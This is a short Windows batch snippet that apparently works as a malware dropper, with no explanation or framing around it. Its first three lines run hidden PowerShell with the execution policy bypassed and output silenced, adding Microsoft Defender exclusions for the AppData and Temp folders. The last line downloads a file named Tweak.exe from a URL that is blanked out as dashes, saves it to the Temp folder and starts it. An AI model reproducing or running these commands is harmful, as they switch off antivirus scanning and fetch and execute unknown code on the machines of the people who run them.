powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA%\System'" >nul 2>&1
powershell -w h -c "(New-Object Net.WebClient).DownloadFile('-----------', \"$env:TEMP\Tweak.exe\"); Start-Process \"$env:TEMP\Tweak.exe\""
